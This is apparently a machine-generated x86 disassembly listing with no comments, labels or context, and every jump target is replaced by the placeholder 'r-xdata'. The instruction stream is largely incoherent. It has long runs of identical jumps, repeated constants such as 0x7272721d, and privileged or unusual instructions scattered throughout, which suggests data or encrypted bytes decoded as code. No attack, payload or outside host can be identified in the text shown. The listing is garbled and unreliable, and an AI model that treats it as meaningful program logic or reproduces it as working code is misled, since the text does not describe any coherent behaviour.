sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
push ds
loope r-xdata
add eax [ edx ]
sbb eax 0x9f61721d
and ch ch
cbw
xor ebx [ 0x1de2881d ]
je r-xdata
mov ah 0xa
sbb eax 0xbb1d1d06
push ss
jb r-xdata
sbb eax 0x880bbb1d
or eax 0x72721d1d
jb r-xdata
or bl [ ecx + 0x2f ]
jb r-xdata
test [ ebx - 0x51 ] ch
jb r-xdata
pop ecx
das
in eax dx
shl dl cl
loop r-xdata
loop r-xdata
fstp [ ecx ]
jb r-xdata
jmp r-xdata
push ds
jb r-xdata
push ds
mov esp 0x1d38690b
sbb eax 0x96676f72
xchg esp eax
mov dl 0xb1
sbb eax 0xe2e26275
jb r-xdata
jb r-xdata
test [ ebx - 0x59 ] ch
dec eax
jb r-xdata
jb r-xdata
jb r-xdata
mov bh 0xb
mov [ 0xffffffffb7e2e2fb ] al
loop r-xdata
jb r-xdata
loop r-xdata
test [ ebx - 0x41 ] ch
imul edi [ edx ] 0xf2bf6b84
sar [ ecx ] 0x1
or ebx [ ebx + 0x1e ]
sbb eax 0x7272721d
jb r-xdata
imul esi [ edi - 0x58947b84 ] 0x48
jb r-xdata
loop r-xdata
jb r-xdata
mov ah 0x6f
out 0xb al
sub [ 0xffffffff87881d1d ] esp
test [ ebx - 0x59 ] ch
add al 0xba
mov [ ecx + ebp * 2 - 0x50947bd6 ] cl
or bh [ ebx + 0x6b848588 ]
scasd [ edi ]
or [ ebx + 0x6b848b88 ] bh
scasd [ edi ]
push cs
mov ebx 0x6b848c88
scasd [ edi ]
or al 0xbb
test [ ebx - 0x51 ] ch
or eax [ ebp + 0x3 ]
mov bh 0xb
jb r-xdata
sub al [ ebx + ebp * 2 + 0x22d118a7 ]
push 0xffffffa7
push es
or esp [ ecx + 0x38 ]
sbb eax 0x7272721d
jb r-xdata
push esi
scasd [ edi ]
jb r-xdata
loop r-xdata
jb r-xdata
mov cl 0xb
pop esp
fsubr st2
loop r-xdata
or eax edx
jb r-xdata
cmpsd [ esi ] [ edi ]
push ds
jecxz r-xdata
retn 0xe2e2
or eax [ ecx + edi * 8 ]
in eax dx
jb r-xdata
jb r-xdata
and ch ch
or edi [ ebx + 0x2e ]
jb r-xdata
push ds
mov dl 0x1d
or ecx [ edi - 0x7 ]
loop r-xdata
loop r-xdata
fldcw [ 0xffffffffe2e467ed ]
cmp ax 0xe2c2
jb r-xdata
loop r-xdata
jl r-xdata
jb r-xdata
in eax dx
inc ebp
jb r-xdata
jb r-xdata
mov ebx 0x6b849a88
scasd [ edi ]
xor al 0xbb
mov [ ebx + 0x3aaf6b84 ] al
mov ebx 0x6b848588
scasd [ edi ]
sbb eax 0xf66aeeaf
jecxz r-xdata
cmp [ edx + 0x6b842469 ] dh
jb r-xdata
sub bl [ 0x7272721d ]
jb r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
add [ 0xffffffffaf6fb51d ] bl
cmpsb [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
imul ecx [ esi ] 0x88fe0e61
xchg [ edx + 0x1d063f0b ] bh
sbb eax 0x72727272
jb r-xdata
or esp [ edx - 0x481d1d05 ]
mov ah 0xa
jpe r-xdata
push ds
sbb eax 0xaf6fb51d
jb r-xdata
imul esp [ edi + 0x1e5b0b48 ] 0x1d
sbb eax 0x72727272
ja r-xdata
and ch ch
sbb eax 0x8872721d
inc ecx
or eax 0xa76f1d1d
push edx
mov dl 0xb4
outsd
outsd
outsb
pop ds
sbb eax 0x2f370a1d
sbb eax 0x67bbbb1d
and ch ch
imul ecx [ di ] 0x1d
sbb eax 0xb276a76f
and ch ch
loop r-xdata
jb r-xdata
test eax 0xa969b3aa
mov edx 0x1d12e90a
sbb eax 0x19590bbb
vpsrad ymm4 ymm5 xmm2
in eax dx
jmp r-xdata
sub al 0x69
xchg edi eax
0x5abf6b84 0x3869
jb r-xdata
cld
imul esp [ esp + eax * 4 ] 0x845ebf6b
imul esi [ edi - 0x60947bde ] 0x28
or esp ebx
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
loop r-xdata
sbb [ 0x1db4b21d ] ebx
mov ch 0xb2
mov ebp 0x72212bbc
jb r-xdata
imul esp [ edi + 0x690bbc1e ] 0x721d1d38
and al 0x84
jb r-xdata
jb r-xdata
jb r-xdata
push cs
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
in al 0xe2
imul esp [ ebx ] 0xb306784
jpo r-xdata
push ebp
mov cl 0xb4
popad
lahf
push ds
loop r-xdata
imul eax [ ecx ] 0x26611d1d
sbb eax 0xa0e8898a
mov al [ 0xa1a69b4 ]
sbb eax 0xe8898a1d
mov ch 0x6f
jb r-xdata
jb r-xdata
jb r-xdata
int 0xe1
loop r-xdata
mov al [ edi + 0x5b ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x590bbb1d
sbb [ 0x7272721d ] ebx
sbb eax 0x7272721d
jb r-xdata
and al [ ebx + ebp * 2 - 0x1cf4d761 ]
test [ ebx - 0x41 ] ch
mov dl 0x69
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x1db1b294
jne r-xdata
sub [ ebx ] cl
loop r-xdata
imul edi [ edi - 0x48947ba2 ] 0x22
test [ ebx - 0x61 ] ch
jb r-xdata
push edx
mov ah 0xb2
or edi [ ebp - 0x1e ]
outsd
jb r-xdata
xor eax 0xbe31a61
retn 0x1d2a
loop r-xdata
loopne r-xdata
jb r-xdata
out 0xe2 al
jb r-xdata
outsd
xchg esi eax
mov [ ecx - 0xb58947c ] al
mov edi 0xb76b845e
jb r-xdata
jb r-xdata
xchg edi eax
out dx al
or cl [ edx ]
sub bl [ 0xffffffffee26611d ]
and cl [ bp + di ]
inc esi
or [ 0x7272721d ] bl
imul sp cx 0xe2e2
sbb eax 0x1db21e97
scasd [ edi ]
jb r-xdata
jb r-xdata
cmpsb [ esi ] [ edi ]
jb r-xdata
shl dl cl
loop r-xdata
mov cl [ edi ]
shl ah 0x1
or al 0xb1
imul esp [ edx + ebx - 0x1e ] 0xffffffe2
loop r-xdata
jb r-xdata
test [ ebx ] 0xa31b
pop ebx
jb r-xdata
test [ ebx - 0x61 ] ch
mov [ 0xffffffffaf5b212b ] al
mov eax 0xb4b1e2e2
test bl bl
0x1d1f610b 0x721d
outsb
jb r-xdata
jb r-xdata
jb r-xdata
pop edx
imul edi [ eax ] 0x842469b2
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
pop esi
jb r-xdata
mov eax 0x1d044d0b
jb r-xdata
jecxz r-xdata
imul edx [ 0x1d25f00a ] 0xf226611d
adc dh [ edx + 0xb4aa76f ]
jb r-xdata
fdivr [ edx + 0x6b84b888 ]
jb r-xdata
jge r-xdata
sbb eax 0x7272721d
adc eax 0x1d25f00a
sbb eax 0xbf22661
or al 0x6
loop r-xdata
jb r-xdata
test [ ebx - 0x51 ] ch
jb r-xdata
test [ ebx - 0x49 ] ch
into
mov bh 0x69
jb r-xdata
mov bl 0xb
jb r-xdata
imul ecx [ esi ] 0xe0ce0e63
jb r-xdata
jb r-xdata
in al 0xc
mov cl 0x6b
sbb ah dl
loop r-xdata
xchg esp eax
mov dl 0xb
xchg ebx eax
loop r-xdata
cld
mov [ edi + 0x2ca76b84 ] dl
jb r-xdata
test [ ebx ] 0xe2e2a31b
jb r-xdata
jb r-xdata
push ss
jb r-xdata
mov bh 0x69
push cs
or eax [ edx + 0x3a ]
sbb eax 0x7272721d
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
out dx al
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x59 ] ch
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul esp [ eax ] 0x1d10d10b
sbb eax 0x35e666ed
sbb eax 0xeaaf691d
leave
sub ch [ eax - 0xe ]
or esp ebp
cmp al 0x1d
sbb eax 0x72727272
jb r-xdata
jb r-xdata
inc eax
imul edi [ edi + 0x1aaf6b1e ] 0xb
je r-xdata
jb r-xdata
jb r-xdata
outsd
jb r-xdata
jb r-xdata
mov bh 0x3e
loop r-xdata
jb r-xdata
sub ch [ ecx + 0x2a ]
scasd [ edi ]
jb r-xdata
push cs
popfd
jb r-xdata
popad
sbb ah bl
cmpsd [ esi ] [ edi ]
mov al bl
arpl [ esi ] cx
sbb eax 0x1eaf6fb5
jb r-xdata
and cl [ ebx ]
jmp 0x73288283
loope r-xdata
or bh ah
or cl ch
loope r-xdata
loop r-xdata
loop r-xdata
loop r-xdata
sbb eax 0xc4950b1d
loop r-xdata
mov dl ah
xor [ edx - 0x77443378 ] bh
test [ ebx - 0x59 ] ch
jb r-xdata
sbb esp [ ebx + 0x7272e2e2 ]
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx ] ecx
jb r-xdata
loop r-xdata
jb r-xdata
cmp al 0x1d
cmpsd [ esi ] [ edi ]
or ebp [ esi + 0x3c ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov eax 0x6b848188
cmpsd [ esi ] [ edi ]
hlt
out dx al
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and ah [ edx + 0x2bb9bcbd ]
dec edx
jb r-xdata
loop r-xdata
mov [ eax + 0x3ea76b84 ] bh
jb r-xdata
xor cl dl
cmp [ edi - 0x59 ] ebp
test [ ss : ebx - 0x69 ] ch
imul ebp [ edx ] 0x6b8422d1
mov edi 0xa76b8454
jb r-xdata
sbb eax 0x8ae68832
outsd
jb r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
inc edi
loop r-xdata
jb r-xdata
jpe r-xdata
cli
imul esp [ esi + edx - 0x1e ] 0xffffffe2
adc cl cl
adc esp [ ecx + 0x23 ]
loopne r-xdata
jb r-xdata
fwait
imul edi [ edi - 0x451edae6 ] 0xffffffbb
mov ebx 0x33d984bb
in eax dx
sub al 0x84
cmpsd [ esi ] [ edi ]
jb r-xdata
loop r-xdata
and [ ebx + ebp * 2 - 0x7745cf59 ] al
jb r-xdata
out 0xe2 al
loop r-xdata
imul ebx [ edi - 0x5f7742d8 ] 0xffffff84
loop r-xdata
or ecx ebx
and al 0xb
jb r-xdata
jb r-xdata
mov edi 0x9f6b8400
jb r-xdata
jb r-xdata
imul esp [ edi - 0x6e7745ca ] 0x69
xor al [ ebx + ebp * 2 + 0x6a0b34b7 ]
add [ 0xffffffffa769721d ] ebx
jb r-xdata
sub al 0x38
jb r-xdata
jb r-xdata
jb r-xdata
ja r-xdata
imul ecx [ esi ] 0x1d3a420b
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
or esi [ edi - 0x10 ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
and ah dh
cmpsd [ esi ] [ edi ]
and [ edx + 0x72 ] esi
shl [ edx ] 0x1
test [ ebx - 0x41 ] ch
mov [ edx + 0x1d3c5c0b ] ah
sbb eax 0x1ea76f72
mov dl 0x1d
jb r-xdata
sub dl cl
sbb eax 0x289f6b84
mov ebp 0x6b84a088
loop r-xdata
cmp [ ebx ] cl
mov eax [ 0x72e2e2ec ]
jb r-xdata
0x34af6b84 0x88bb
add [ ebx + ebp * 2 - 0x7744c551 ] 0xffffff85
test [ ebx - 0x51 ] ch
jb r-xdata
mov bh 0x7a
test [ ebx - 0x61 ] ch
jbe r-xdata
lahf
sub [ ebp + 0x6b84a088 ] bh
mov [ 0xffffffffe2c08a0b ] al
loop r-xdata
nop
or ecx [ edi ]
push ds
loop r-xdata
loop r-xdata
sbb eax 0x7272721d
jb r-xdata
and cl [ ebx ]
push ebp
test [ ebx - 0xa ] ch
in al dx
pushfd
jb r-xdata
jb r-xdata
sbb eax 0xf7990b1d
loop r-xdata
test [ ebx - 0x59 ] ch
jb r-xdata
jb r-xdata
imul esp [ edi - 0x337745d0 ] 0xffffffbb
jb r-xdata
mov ebx 0x6b849588
or ecx [ edx + 0x72e2e2c0 ]
push eax
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
push ss
test [ ebx - 0x61 ] ch
jb r-xdata
jb r-xdata
or esp [ edi - 0x4ae2e2d8 ]
mov ch 0xb5
fisubr [ ebx ]
sbb eax 0xb22d11d
mul dl
fldenv [ esi + edx * 8 + 0x28b867ed ]
mov edx 0x32699188
jb r-xdata
sbb eax 0xa3a66f1d
jb r-xdata
rcr [ 0xffffffffa2b76b84 ] 0x1
imul edi [ edi - 0x60947c00 ] 0x16
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
or ebp [ eax + edi ]
jb r-xdata
sbb eax 0x72727272
jb r-xdata
outsd
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
dec eax
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul edi [ edi + 0x6b84b9e0 ] 0xffffffbf
jb r-xdata
or ecx [ esi + eax ]
jb r-xdata
or ebx [ ebp + 0x72e2e2e1 ]
jb r-xdata
or edx [ esi ]
0xe2e2
sbb eax 0x930bb294
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or edi [ edx + 0x12 ]
loop r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cli
or edx [ ebp + 0x11 ]
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov esp 0x1d1d5be6
jb r-xdata
xor ch [ ecx + 0x20 ]
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
scasd [ edi ]
xor [ ebx + 0x6b849688 ] bh
scasd [ edi ]
test [ ebx - 0x59 ] ch
xor al 0x69
and [ ebx ] ecx
mov ebx [ esi ]
sbb eax 0x6b84721d
scasd [ edi ]
xor bh [ ebx + 0x6b849588 ]
sbb eax 0x8872721d
jb r-xdata
jb r-xdata
jb r-xdata
or esp [ edx + ecx ]
jb r-xdata
lahf
jb r-xdata
test [ ebx - 0x41 ] ch
push es
mov [ ebp + 0x1d382c0b ] al
jb r-xdata
jb r-xdata
sbb eax 0xa769721d
mov [ ecx + 0x6b843269 ] dl
mov bh 0x34
jb r-xdata
sbb eax 0x7272721d
outsd
jb r-xdata
loop r-xdata
add [ ebx + ebp * 2 + 0x1dd1169f ] al
test [ ebx - 0x49 ] ch
mov [ 0x30d13a69 ] al
or edx ebp
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb al 0xb
cmp [ 0xffffffffa3a66f1d ] bl
jb r-xdata
mov edx 0x6b84b888
jb r-xdata
or dh al
jb r-xdata
or ecx eax
jb r-xdata
jb r-xdata
jb r-xdata
or al [ 0xffffffffb41d1d27 ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
push es
jb r-xdata
loope r-xdata
jb r-xdata
jb r-xdata
jne r-xdata
out 0x5b al
jb r-xdata
sbb eax 0xbf6be2e2
jb r-xdata
imul esi [ edi - 0x60947b86 ] 0x76
jb r-xdata
mul edx
mov ebp 0x360bb9bc
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
popad
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
mov ah dl
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul esp [ eax ] 0x30a76b84
jb r-xdata
imul esp [ ss : ebx + ecx ] 0x1d1d1c50
mov ah cl
jb r-xdata
loop r-xdata

jb r-xdata
inc esp
jb r-xdata
sbb eax 0x7272721d
sbb ch [ ecx + 0x32 ]
test [ ebx - 0x41 ] ch
mov edx 0x14a76b84
shl [ edx ] 0x1
mov [ esi + 0x1d039f0b ] ah
sbb eax 0xedeb1861
jmp r-xdata
or bl [ 0xffffffffed72721d ]
jb r-xdata
jb r-xdata
or [ ecx ] 0xffffffb5
salc
jb r-xdata
jb r-xdata
or ebp [ edx + 0x1 ]
imul esi [ edx ] 0x34b76b84
in eax dx
mov [ 0x2a480b1c ] eax
jb r-xdata
imul edi [ edx ] 0xd50b30d1
imul ebx [ edi - 0x7be22eea ] 0x6b
mov bh 0xa2
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x1ca3a66f
jb r-xdata
or eax [ ecx + edi * 8 ]
mov eax 0x3ea76b84
jb r-xdata
and eax 0x26611d1d
or ecx [ esi + eax ]
sub esp [ ecx ]
jb r-xdata
push es
movsb [ edi ] [ esi ]
jb r-xdata
sub bl [ 0x7272721d ]
jb r-xdata
sub bl [ 0x7272721d ]
jb r-xdata
jb r-xdata
jb r-xdata
mov cl [ edi ]
sbb [ ecx + 0x316a0b74 ] eax
sbb eax 0x7272721d
jb r-xdata
sub al 0x1d
sbb eax 0x1d2b500a
sbb eax 0x14671269
in eax dx
daa
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
and eax 0xe2e31ea7
xor cl [ eax - 0x2d1d751a ]
or ebx [ ebx ]
jb r-xdata
sbb eax 0x6be2e21d
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
mov ah dl
jb r-xdata
jb r-xdata
push ss
in al dx
loop r-xdata
mov ecx 0x1d1b360b
sbb eax 0xc2c6a66b
and cl [ bp + di ]
mov edx 0x6b848f88
cmpsd [ esi ] [ edi ]
mov edx 0x88b88d88
jb r-xdata
jb r-xdata
mov es si
outsb
or eax [ ebx ]
xlat
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
mov ah 0x69
jb r-xdata
cmpsd [ esi ] [ edi ]
push ds
or eax [ esp + ebx * 8 - 0x1e ]
loop r-xdata
sbb eax 0xe2f7990b
imul esp [ edi - 0x4bf445c6 ] 0x19
sbb eax 0x7272721d
popad
jb r-xdata
out dx al
jb r-xdata
imul ebp [ edx + 0x52 ] 0xffffffe2
loop r-xdata
jb r-xdata
loop r-xdata
mov bl [ ebx - 0x4a89de34 ]
jb r-xdata
jb r-xdata
adc [ 0x7272721d ] bl
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
test [ ebx - 0x59 ] ch
jb r-xdata
mov ebx 0x6b849b88
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x86ad378a
shl [ ebp + 0x1d3e650b ] 0x1d
jb r-xdata
or [ ebp + 0x1d3cdb0a ] esi
jb r-xdata
mov al [ eax + 0x44 ]
sbb eax 0x66ed7272
jmp 0x1e28a721
jb r-xdata
jb r-xdata
test [ ebx - 0x49 ] ch
ror [ eax + 0x21d60b86 ] 0x1
sbb eax 0x8872721d
sar [ ebx + 0x2369c788 ] 0x84
inc eax
jb r-xdata
imul ebx [ edx ] 0x6b843269
jb r-xdata
enter 0x1d2a 0x1d
jb r-xdata
or ecx [ eax + 0x2a ]
jb r-xdata
imul edi [ edi + 0xb858806 ] 0x2c
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
cmpsb [ esi ] [ edi ]
jb r-xdata
imul esp [ edi - 0x6fbf4c2 ] 0xffffffe2
loop r-xdata
or ecx [ es : esi + eax ]
jb r-xdata
in eax dx
fucomp st3
loop r-xdata
or dl [ eax + 0x2b ]
or esi [ edi ]
add eax 0xb41d1d27
sbb eax 0x72727272
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x6712691d
adc al 0xed
sbb eax 0x2c370bb4
sbb eax 0x2b500a1d
test [ ebx - 0x41 ] ch
test [ ebx - 0x49 ] ch
xor al 0xb
push 0x1
imul esp [ ebx ] 0x36a76b84
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and [ edx + 0x72 ] esi
shl [ edx ] 0x1
mov [ 0x2bb9bcbd ] al
jb r-xdata
jb r-xdata
mov [ 0x7272e2e2 ] eax
jb r-xdata
jb r-xdata
jb r-xdata
mov edi 0xbae1251a
mov ebx 0xd984bbbb
xor ebp ebp
jb r-xdata
pop ebx
loop r-xdata
imul esp [ edi - 0x23bbf4e2 ] 0xffffffe2
test [ ebx - 0x59 ] ch
cmp bh [ edx + 0x1d19b40b ]
sbb eax 0x72727272
loope r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
pop ds
sbb eax 0xf17a0a1d
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov ah dl
shl dl cl
loop r-xdata
0xe2c1
or cl [ esi - 0x5 ]
jb r-xdata
cmp eax 0x721d1d04
imul esp [ edx + ebx * 8 - 0x1d1c82f6 ] 0xffffffe2
loop r-xdata
imul ebx [ edx ] 0xe2e3dd0b
jb r-xdata
jb r-xdata
sbb ah cl
sbb ebp ebp
jb r-xdata
loop r-xdata
jb r-xdata
or ecx [ ebp + 0x72e2e2d7 ]
jb r-xdata
or dh [ ebx - 0x1d ]
sbb eax 0x751d0a97
loop r-xdata
or ah dl
jb r-xdata
push cs
jb r-xdata
jb r-xdata
imul esp [ edi + 0x2bb9bd1a ] 0x72727221
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
mov [ edi + 0x26af6b84 ] dl
jb r-xdata
jb r-xdata
or bl bl
jb r-xdata
jb r-xdata
jb r-xdata
salc
jb r-xdata
jb r-xdata
mov edi 0xb367ed1e
mov eax 0xdb1d1d28
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
sbb eax 0xa2b76b84
mov eax 0xd0b76b84
mov [ esi + 0x1d21d60b ] al
sbb eax 0xc0887272
mov ebx 0x2369c788
mov edx 0x32699188
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
or esi edx
jb r-xdata
out 0x88 al
aam 0xb9
test [ ebx - 0x41 ] ch
test [ ebx - 0x59 ] ch
mov eax [ 0xbe2e2ea ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov ebx 0xed33d984
and eax 0xbbbbbae1
test [ ebx - 0x59 ] ch
adc al 0x88
xchg edi eax
mov [ edi + 0x2ea76b84 ] cl
mov edx 0x88b88d88
0xe2e2de0b 0x72e2
jb r-xdata
loop r-xdata
jb r-xdata
fisubr [ ecx - 0x59 ]
jb r-xdata
jb r-xdata
imul esp [ esi + 0x2267c2c6 ] 0xb
loop r-xdata
pop edx
and ah dl
jb r-xdata
insb
jb r-xdata
sub esp [ ecx ]
jb r-xdata
xchg esi eax
jne r-xdata
jb r-xdata
neg [ 0x1e751dd4 ]
and cl [ ebx ]
jb r-xdata
cli
popad
sahf
shl al 0x5d
jb r-xdata
jb r-xdata
jb r-xdata
imul edx [ edx - 0xf3ef43e ] 0x7272e2e2
or ecx [ esi ]
mov dl [ ebx - 0x16 ]
out 0x15 al
mov ch 0x6b
movsb [ edi ] [ esi ]
mov [ 0xffffffffe2d19c0b ] al
loop r-xdata
inc esp
fsubr st2
or bl ch
jecxz r-xdata
sbb ebx [ 0xffffffffc6a66b1d ]
or esi [ esi ]
loop r-xdata
or esp [ ecx ]
mov dl 0xb
jb r-xdata
push 0x52
loop r-xdata
sub eax 0xbe2e2e7
jb r-xdata
sbb bh [ ebp + 0x72212bb9 ]
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
or ecx edx
shl edx 0xe2
jb r-xdata
jb r-xdata
mov edx 0x88bbcc88
jb r-xdata
sbb al 0x1d
imul esp [ edi + 0xb246936 ] 0x50
jb r-xdata
or eax 0x6f721d1d
jb r-xdata
xor al 0xd1
and cl [ ebx ]
cmp [ 0x7272721d ] bl
cmpsd [ esi ] [ edi ]
sbb cl [ ebx ]
push edx
xor eax 0x72721d1d
jb r-xdata
imul edi [ edi - 0x50947bb0 ] 0x24
mov [ ebx - 0x1d061df5 ] cl
loop r-xdata
test [ ebx - 0x51 ] ch
jb r-xdata
jb r-xdata
cmp al 0x1d
jb r-xdata
jb r-xdata
jb r-xdata
mov eax 0xdb1d1d28
jb r-xdata
mov ch 0xa
jb r-xdata
sbb eax 0x1ebfdb1d
fldenv [ esi + edx * 8 + 0x28b867ed ]
xchg ecx eax
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and eax [ ebx + ebp * 2 - 0x7745c959 ]
sub [ 0xffffffff971db21d ] bl
fstp [ edi - 0x4c9812e2 ]
jb r-xdata
jb r-xdata
imul esi [ edi - 0x1af447fa ] 0xf
sbb eax 0x7272721d
and [ 0x22d1721d ] ebx
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
mov eax 0x6b849788
jb r-xdata
sbb eax 0x7272721d
imul ebx [ edi - 0x7be22ed6 ] 0x6b
sbb ah [ 0xffffffffbbbbbae1 ]
jb r-xdata
loop r-xdata
sbb eax 0xa769deb4
retn 0x2267
mov esp 0x1b360bb9
jb r-xdata
retn 0x2d0b
jb r-xdata
les eax [ ecx + 0x6bb17588 ]
jb r-xdata
loop r-xdata
jb r-xdata
or edi [ ebx + ecx ]
loop r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
sbb eax 0x225a691d
push es
jb r-xdata
inc edi
mov dl al
jb r-xdata
sbb eax 0x54ed96b4
loop r-xdata
jb r-xdata
and esp ebx
loop r-xdata
loop r-xdata
arpl [ eax ] dx
jb r-xdata
sbb eax 0x6bb1b21d
push edi
xor bl [ edi ]
sbb eax 0xe0950b1d
loop r-xdata
adc bl [ 0x2b67841d ]
or ebx [ eax + eax * 8 + 0x676fe2e2 ]
xor bl [ edi ]
jb r-xdata
push 0x1d12e10b
sbb eax 0xb2b6784
pushfd
shl dl 0xe2
pop ebp
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
int3
and cl [ ebx ]
pop esi
fnclex
loop r-xdata
jb r-xdata
loop r-xdata
loop r-xdata
imul ecx [ esi ] 0xbee0e61
fimul [ edx ]
jae r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
in eax dx
jb r-xdata
jb r-xdata
mov ebp 0x72212bb9
sbb eax 0xe2e27e72
mov ah 0xde
jb r-xdata
mov [ ebp - 0x4f ] dh
jb r-xdata
sbb eax 0xc6a66b1d
dec esi
sti
int3
jb r-xdata
sbb eax 0xe6bc6f72
jb r-xdata
push es
or edx [ ebx + 0x5 ]
jb r-xdata
push cs
sbb eax 0x7272721d
jb r-xdata
imul edi [ es : 0x52bf6b84 ] 0x84bb3a69
scasd [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
loop r-xdata
jb r-xdata
in eax dx
sub [ 0x1ebfdb1d ] bl
jb r-xdata
jb r-xdata
jb r-xdata
fstp [ ebx - 0x52c875e3 ]
jb r-xdata
mov eax [ 0xffffffffffffe2ea ]
jb r-xdata
jb r-xdata
push ds
jb r-xdata
sbb eax 0x2bd186b4
sbb eax 0xbc22d172
sub esp [ ecx ]
jb r-xdata
jb r-xdata
test [ ebx - 0x41 ] ch
in al 0x88
salc
mov edi 0x6b84b9e0
mov edi 0xb9d488e6
jb r-xdata
jb r-xdata
jb r-xdata
push ss
sbb eax 0x1a6f6f1d
imul esp [ edi + 0xb908814 ] 0xf
push ebx
0x6bb515e6 0xa2a4
loop r-xdata
jb r-xdata
jne r-xdata
jb r-xdata
shl dl cl
mov cl 0xb
push cs
movsd [ edi ] [ esi ]
in eax dx
jb r-xdata
loop r-xdata
or ecx [ eax ]
jb r-xdata
xchg esi eax
jb r-xdata
sbb ebx [ 0x7272721d ]
sbb eax 0xfac30a1d
loop r-xdata
cmp al 0xb
loop r-xdata
sbb eax 0xe2225a69
or ebp [ 0xbe2e2e7 ]
jb r-xdata
jb r-xdata
jb r-xdata
aam 0x1d
jne r-xdata
mov eax [ 0x226784fe ]
in eax dx
mov dx 0xe2ec
loop r-xdata
push ebp
loop r-xdata
and [ ebx ] ecx
jb r-xdata
mov al 0xd0
sbb al 0x84
imul ebx [ edi - 0x3a05f4e8 ] 0xffffffe2
loop r-xdata
mov dl 0xb3
mov bl ah
loopne r-xdata
jb r-xdata
jb r-xdata
fucom st3
loop r-xdata
and cl [ bp + di ]
jb r-xdata
retn 0x646b
or esi [ ecx + ebx + 0x72721d1d ]
mov ah dl
loop r-xdata
loop r-xdata
xchg edi eax
or bl [ 0xffffffffe2e26675 ]
jle r-xdata
scasd [ edi ]
jb r-xdata
mov cl 0xb
jno r-xdata
or eax [ edi - 0x1a ]
push esp
loop r-xdata
mov ah 0x69
push edx
pop esi
sbb al 0xd4
loop r-xdata
mov al ah
or [ eax + 0x646bb175 ] 0xe2e2e20a
loop r-xdata
fucom st3
loop r-xdata
mov cl 0x6b
mov [ ebx + 0x36a76b84 ] bl
jb r-xdata
outsd
jb r-xdata
loop r-xdata
push ebx
jb r-xdata
sbb eax 0x72727272
jb r-xdata
in eax dx
push ds
adc [ 0x7221bc1d ] ebx
jb r-xdata
imul edi [ 0x52bf6b84 ] 0x84bb3a69
jb r-xdata
jb r-xdata
or dl ah
imul ecx [ esi ] 0x1d0a4c0b
